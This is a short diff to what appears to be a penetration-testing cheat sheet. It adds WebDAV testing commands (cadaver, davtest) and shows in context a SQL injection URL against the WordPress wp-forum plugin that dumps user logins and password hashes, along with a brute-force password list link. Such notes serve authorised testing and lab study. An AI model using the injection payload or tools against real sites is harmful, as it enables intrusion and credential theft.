@@ -42,6 +42,9 @@ Wordpress
     Try exploit:
     */wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group_concat%28user_login,0x3a,user_pass%29+from+wp_users%23*
 
+Webdav
+    *$ cadaver http://$ip*
+    *$ davtest http://$ip*
 Bruteforcing
     Good password list
     *https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_1000.txt*
